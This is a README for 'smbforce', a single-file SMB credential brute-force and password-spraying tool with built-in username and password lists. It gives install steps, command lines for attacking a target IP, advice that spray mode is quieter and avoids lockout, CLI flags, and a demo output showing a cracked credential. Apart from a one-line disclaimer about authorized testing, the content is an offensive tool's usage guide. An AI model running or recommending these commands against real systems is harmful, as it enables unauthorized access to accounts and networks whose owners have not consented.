# smbforce

SMB credential brute force. Built-in wordlists — 67 usernames, 148 passwords, 9,916 combinations. Single file. Zero configuration.

**Dev:** Dravik — TG: [@x_tcp](https://t.me/x_tcp)

## Features

- Built-in wordlists: 67 usernames, 148 passwords (9,916 combinations)
- SMB2/3 via `impacket.smbconnection`
- Spray mode: one password across all users before the next password
- Lockout detection: stops immediately on `STATUS_ACCOUNT_LOCKED_OUT`
- Configurable delay between attempts
- no external wordlists needed

## Install

    git clone https://github.com/dravik505/smbforce.git
    cd smbforce
    python3 -m venv .venv
    source .venv/bin/activate
    pip install -r requirements.txt

## Usage

Basic brute force:

    python3 smbforce.py -ip 192.168.1.28

Spray mode (slower, quieter, avoids lockout):

    python3 smbforce.py -ip 192.168.1.28 --spray --delay 1.5

Single user, full password list:

    python3 smbforce.py -ip 192.168.1.28 --user administrator

Single password across all users:

    python3 smbforce.py -ip 192.168.1.28 --password 'P@ssw0rd'

Domain account:

    python3 smbforce.py -ip 192.168.1.28 -d CORP

Custom port and cap:

    python3 smbforce.py -ip 192.168.1.28 -P 139 --max 500

## Demo

    smbforce — SMB brute force
    Dev: Dravik  TG: @x_tcp

    [*] target: 192.168.1.28:445
    [*] users: 67  passwords: 148  total: 9916
    [*] mode: cartesian  delay: 0.3s  max: 5000

    [.] 50/9916  (3.2/s)
    [.] 100/9916  (3.3/s)
    [+] SUCCESS  smbtest:smbtest
    [.] 150/9916  (3.3/s)
    [.] 200/9916  (3.3/s)

    [+] 1 valid credential(s):
        smbtest:smbtest

## CLI flags

| Flag | Description |
|------|-------------|
| `-ip` | target IP (required) |
| `-P, --port` | SMB port (default 445) |
| `-d, --domain` | NTLM domain |
| `--delay` | seconds between attempts (default 0.3) |
| `--max` | max attempts before stopping (default 5000) |
| `--spray` | one password per user before next password |
| `--user` | restrict to one username |
| `--password` | restrict to one password (empty = blank) |

## Output codes

| Line | Meaning |
|------|---------|
| `[+] SUCCESS user:pass` | valid credential |
| `[.] N/M (rate/s)` | progress every 50 attempts |
| `[?] error on user` | connection or protocol error |
| `[!] ACCOUNT LOCKED` | lockout detected, stopping |

## Disclaimer

Provided as-is for security research and authorized testing. The author assumes no liability for misuse or damage caused by this tool.

## License

MIT
